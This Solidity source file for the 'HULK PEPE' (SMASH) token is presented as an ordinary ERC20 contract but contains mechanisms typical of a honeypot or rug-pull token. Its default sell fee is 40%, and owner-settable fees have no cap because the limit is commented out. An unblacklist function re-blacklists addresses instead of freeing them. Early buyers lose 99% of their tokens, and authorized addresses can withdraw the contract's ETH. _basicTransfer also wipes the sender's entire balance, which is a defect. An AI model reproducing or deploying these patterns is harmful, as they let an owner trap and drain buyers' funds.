/**
 *Submitted for verification at Etherscan.io on 2023-05-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED");
        _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner);
        owner = address(0);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address liqPair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SMASH is IERC20, Auth {

    address public marketingFeeReceiver =
        0x9B9aF8e081943cB3D5F0bCfcad230a60C48a7359;


    string constant _name = "HULK PEPE";
    string constant _symbol = "SMASH";

    uint8 constant _decimals = 18;

    uint8 constant _zeros = 9;

    uint8 constant _maxTx = 10;
    uint8 constant _maxWallet = 10;

    uint8 constant _threshpct = 1;

    uint256 _totalSupply = 1 * 10**_zeros * 10**_decimals;
    uint256 public _maxTxAmount = (_totalSupply*_maxTx)/1000;
    uint256 public _maxWalletToken = (_totalSupply*_maxWallet)/1000;
    uint256 public swapThreshold = (_totalSupply*_threshpct)/10000;

    uint256 public buyFee = 200;
    uint256 public sellFee = 400;

    uint256 public feeDenominator = 1000;
 
    uint256 deadblocks = 1;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    mapping(address => bool) isWalletLimitExempt;
    mapping(address => bool) private _isBlacklisted;




    IDEXRouter public Irouter02;
    address public liqPair;

    bool public tradingLive = false;

    bool public limitsEnabled = true;
    bool public swapEnabled = true;

    bool inSwap;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }


    constructor() Auth(msg.sender) {
        Irouter02 = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        liqPair = IDEXFactory(Irouter02.factory()).createPair(
            Irouter02.WETH(),
            address(this)
        );

        _allowances[address(this)][address(Irouter02)] = type(uint256).max;


        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[liqPair] = true;

        _approve(owner, address(Irouter02), type(uint256).max);
        _approve(address(this), address(Irouter02), type(uint256).max);

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");
        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(
            !_isBlacklisted[from] && !_isBlacklisted[to],
            "Blacklisted address"
        );
        if (inSwap) {
            return _basicTransfer(from, to, amount);
        }


        if (!authorizations[from] && !authorizations[to]){
            require(tradingLive, "Trading not open yet");
            if (limitsEnabled) {
                if (!authorizations[from] && !isWalletLimitExempt[to]) {
                    uint256 heldTokens = balanceOf(to);
                    require(
                        (heldTokens + amount) <= _maxWalletToken,
                        "max wallet limit reached"
                    );
                }
                checkAmountTx(from, amount);
            }
        }

        if (shouldSwapBack(from)) {
            swapBack(swapThreshold);
        }

        _balances[from] -= amount;

        uint256 amountReceived;
        if(deadblocks > block.number && to != liqPair){
          amountReceived = amount / 100;
          _balances[to] += amountReceived;
          _balances[address(this)] += amount - amountReceived;
          emit Transfer(from, address(this), amountReceived);

        }else{
            amountReceived = (!shouldTakeFee(from) || !shouldTakeFee(to))
              ? amount
              : takeFee(from, amount);
            _balances[to] += amountReceived;
        }
        emit Transfer(from, to, amountReceived);
        return true;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= _balances[sender];
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkAmountTx(address sender, uint256 amount) internal view {
        require(
            amount <= _maxTxAmount || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }

    function shouldSwapBack(address from) internal view returns (bool) {
        if (
            !inSwap &&
            swapEnabled &&
            !isTxLimitExempt[from] &&
            from != liqPair &&
            _balances[address(this)] >= swapThreshold
        ) {
            return true;
        } else {
            return false;
        }
    }

    function swapbackEdit(bool _enabled) public onlyOwner {
        swapEnabled = _enabled;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, uint256 amount)
        internal
        returns (uint256)
    {
        uint256 _fee;
        if (sender != liqPair) {
            _fee = sellFee;
        } else if (sender == liqPair) {
            _fee = buyFee;
        } else {
            return amount;
        }
        uint256 contractTokens = (amount * _fee) / 1000;
        _balances[address(this)] += contractTokens;
        emit Transfer(sender, address(this), contractTokens);
        return amount - contractTokens;
    }

    function swapBack(uint256 amountAsked) internal swapping {
        uint256 amountToSwap = amountAsked;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = Irouter02.WETH();
        Irouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        (bool tmpSuccess, ) = payable(marketingFeeReceiver).call{
            value: address(this).balance,
            gas: 30000
        }("");
        tmpSuccess = false;
    }

    function setLimits(uint256 maxWallPercent, uint256 maxTXPercent)
        external
        onlyOwner
    {
        //require(maxWallPercent > 5, "Max wallet can't be lower than 0.5%");
        //require(maxTXPercent > 1, "Max wallet can't be lower than 0.1%");
        _maxWalletToken = _totalSupply*maxWallPercent/1000;
        _maxTxAmount = _totalSupply*maxTXPercent/1000;
    }

    function setSwapThreshold(uint256 _swapThreshold) external onlyOwner {
        //require(_swapThreshold < 50, "threshold too high");
        swapThreshold = _totalSupply*_swapThreshold/10000;
    }


    function blacklist(address[] calldata addrs) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            _isBlacklisted[addrs[i]] = true;
        }
    }

    function unblacklist(address[] calldata addrs) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            _isBlacklisted[addrs[i]] = true;
        }
    }

    // Input the amount of token you wish to swapback
    function sweepContingency(uint256 amount) external authorized {
        require(balanceOf(address(this)) >= amount, "not enought tokens");
        swapBack(amount);
    }

    function clearStuckBalance() external authorized {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH);
    }

    function enableTrading() external onlyOwner {
        require(!tradingLive, "already launched");
        tradingLive = true;
        deadblocks = block.number + deadblocks;
    }

    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsWalletLimitExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        isWalletLimitExempt[holder] = exempt;
    }

    function setFees(
        uint256 _buyFee,
        uint256 _sellFee
    ) external onlyOwner {
        buyFee = _buyFee;
        sellFee = _sellFee;
        // Uncomment and modify if you want to have max fee enabled
        //require(sellFee < 100 && buyFee < 100, "Fees cannot be more than 10%");
    }


    function enableLimits() external onlyOwner{
        limitsEnabled = true;
    }

    function disableLimits() external onlyOwner{
        limitsEnabled = false;
    }
}